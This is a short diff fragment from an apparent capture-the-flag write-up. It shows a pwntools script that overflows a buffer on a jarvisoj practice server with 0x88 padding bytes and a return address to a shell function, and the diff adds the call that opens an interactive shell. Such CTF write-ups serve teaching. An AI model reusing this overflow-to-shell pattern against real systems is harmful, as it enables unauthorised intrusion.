@@ -38,6 +38,8 @@ from pwn import *
 p=remote('pwn2.jarvisoj.com',9881)
 shell_addr=0x400596
 p.sendline('A'*0x88+p64(shell_addr))
+p.interactive()
+
 ```
 ## level1
 ```py
